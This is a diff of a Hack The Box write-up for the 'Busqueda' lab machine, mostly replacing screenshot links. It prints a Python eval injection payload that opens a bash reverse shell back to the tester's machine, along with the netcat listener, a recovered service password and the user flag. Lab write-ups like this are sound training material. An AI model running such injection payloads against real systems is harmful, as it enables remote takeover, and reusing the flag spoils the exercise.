@@ -1,4 +1,6 @@
-# About
+# Busqueda Walkthrough ![busqueda](https://github.com/securepadawan/Hack_The_Box/assets/66234098/9ba43378-389b-4aaa-8a46-bbff09ed722b)
+
+# About 
 
 - Operating System: Linux
 - Point Value: 30 Total (20 System and 10 for User)
@@ -15,73 +17,73 @@
 
 Open Terminal and then do an nmap scan. `nmap -sV 10.129.138.207`
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b5b62aff-a5f7-48a9-9d72-dab6f029c389/Untitled.png)
+![busqueda1](https://github.com/securepadawan/Hack_The_Box/assets/66234098/a6a57759-492e-4f63-8472-e121a7bd502f)
 
 This nmap scan shows port 80 is open which we can use. When opening the browser go to `10.129.138.207` , it re-directs to `searcher.htb` . 
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/627f93b5-7c3f-44ba-bd35-70ba5e1d287f/Untitled.png)
+![busqueda2](https://github.com/securepadawan/Hack_The_Box/assets/66234098/f1c34be1-1e45-4428-abe2-2afab97db482)
 
 It is necessary to modify the /etc/hosts. To do this, you will need to do `sudo nano /etc/hosts` and then add `10.129.138.207 searcher.htb`. 
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/987063fa-08af-4536-8b2f-3146120ad842/Untitled.png)
+![busqueda3](https://github.com/securepadawan/Hack_The_Box/assets/66234098/5eb73733-7430-4428-814e-597e5be55723)
 
 *Note: If you try accessing /etc/hosts just by doing `nano /etc/hosts` to modify and save, you get a Permission denied message.*
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3580f088-1262-48a5-b18a-e9f0caa90f87/Untitled.png)
+![busqueda4](https://github.com/securepadawan/Hack_The_Box/assets/66234098/3c741791-f381-4908-9254-bd6a05359932)
 
 After successfully exiting and saving /etc/hosts, go back to the browser and try accessing `10.129.138.207` again. The site comes up and shows the following:
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f18014d4-7a02-442d-8906-04082f9fa6bc/Untitled.png)
+![busqueda5](https://github.com/securepadawan/Hack_The_Box/assets/66234098/6a7b51ae-f489-4600-a09d-97f489fe304e)
 
 When scrolling to the very bottom, I saw “Powered by Flash and Searchor 2.4.0”
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/74fb4379-b0a3-4a5b-b1fc-619eaf4821a6/Untitled.png)
+![busqueda6](https://github.com/securepadawan/Hack_The_Box/assets/66234098/71a99b57-a2e6-4486-97d0-786b5e59ab2b)
 
 When doing a search for “Searchor 2.40 exploit”, I found the following [GitHub](https://github.com/jonnyzar/POC-Searchor-2.4.2). I can then go back to my terminal and do a `git clone https://github.com/jonnyzar/POC-Searchor-2.4.2.git` .
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f842d638-4aaa-4d65-859a-118dca727055/Untitled.png)
+![busqueda7](https://github.com/securepadawan/Hack_The_Box/assets/66234098/08b29339-84ca-4786-9a20-e9102ac18ffb)
 
 After download complete, I can confirm by doing a `ls` and see POC-Searchor-2.4.2 is saved. I can then change directory (`cd POC-Searchor-2.4.2`) and run another `ls` to see the items listed there.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e7ae5242-630d-46c2-8c6f-546126855000/Untitled.png)
+![busqueda8](https://github.com/securepadawan/Hack_The_Box/assets/66234098/319dafd4-bc05-420e-8770-79963e678742)
 
 I can then did `cat [README.md](http://README.md)` to read the file. When reading the file, it mentions Python eval. 
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ac853081-a7c0-4431-ade7-73648c5e3908/Untitled.png)
+![busqueda9](https://github.com/securepadawan/Hack_The_Box/assets/66234098/dcd87d17-e090-4c5c-b3a6-ae0284a7e2c5)
 
 So I did some research and found a site that mentions [Arbitrary Code Execution](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-eval-code-execution/). I copied the code under Reverse Shell `__import('os').system('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"')`
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/45dfe8da-299b-46b6-81f8-3dec04d2be9b/Untitled.png)
+![busqueda10](https://github.com/securepadawan/Hack_The_Box/assets/66234098/77c3822e-afde-46e2-ab9e-f6b41af41350)
 
 I then had to modify this code by adding `'),` , modifying the IP address to `10.10.14.12` (which is my computer) and adding at the end a space and `#` . This is how the whole thing looked like: `'),__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.14.12/4444 0>&1"') #` . I found this by doing combinations of the Arbitrary Code Execution listed above the Reverse Shell.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dedcaece-de9a-41ad-a8e7-c4c179460363/Untitled.png)
+![busqueda11](https://github.com/securepadawan/Hack_The_Box/assets/66234098/79c5f514-7672-4d62-879f-0a34d31110a1)
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/70cd94b4-319b-454c-a7f8-2416173ea81e/Untitled.png)
+![busqueda12](https://github.com/securepadawan/Hack_The_Box/assets/66234098/1dc4f4cf-c484-428e-af47-48dd7207567f)
 
 After typing in my terminal `nc -lvnp 4444` and then clicking “Search”, the following showed on my terminal. I also typed `whoami` to confirm.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7faa7cc1-c012-4ddc-ba17-9eaed4a95e88/Untitled.png)
+![busqueda13](https://github.com/securepadawan/Hack_The_Box/assets/66234098/597a0a4b-11d7-4418-9b2f-7de81e39f9a1)
 
 I then ran the following commands: `ls -la` `cd .git` `ls -la` 
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5dfe3d11-f4f0-4365-aae4-9a0b4d50d3d5/Untitled.png)
+![busqueda14](https://github.com/securepadawan/Hack_The_Box/assets/66234098/f7cd9005-f948-4da5-a2f1-3b736e290306)
 
 After running `cat config` , I came across the following. `jh1usoih2bkjaspwe92` turns out is the password
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5cecbca6-f778-4441-be47-b4def3aa8cad/Untitled.png)
+![busqueda15](https://github.com/securepadawan/Hack_The_Box/assets/66234098/964c3cfa-4420-4e4e-87e8-3ab7434713c4)
 
 I created a second terminal session and did `ssh svc@10.129.138.207` . When prompted for the ECDSA key fingerprint, typed`yes` . For the password, I put `jh1usoih2bkjaspwe92` .
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0a38ec09-f797-4075-b5b9-7e06c337bf93/Untitled.png)
+![busqueda16](https://github.com/securepadawan/Hack_The_Box/assets/66234098/ceff25b5-b74d-4a28-a7cc-c4a7bb4b7dbc)
 
 I used the command`whoami` to confirm.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/149e5f46-8440-405f-86f9-fbc084e2fa1f/Untitled.png)
+![busqueda17](https://github.com/securepadawan/Hack_The_Box/assets/66234098/2bc5b580-ecdd-4b59-9467-feed52cacb8f)
 
 When running `ls -la` , I saw the file `user.txt`. So I can `cat user.txt` and found the user flag.
 
-![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f71c4a83-5ab0-4e66-bf5c-c0d9067e3e3a/Untitled.png)
+![busqueda18](https://github.com/securepadawan/Hack_The_Box/assets/66234098/421103bf-1b95-479d-a2bf-013111f557ff)
 
 User Flag: `8bae7d0bac9792fcb1a6fc7bedf96360`
 
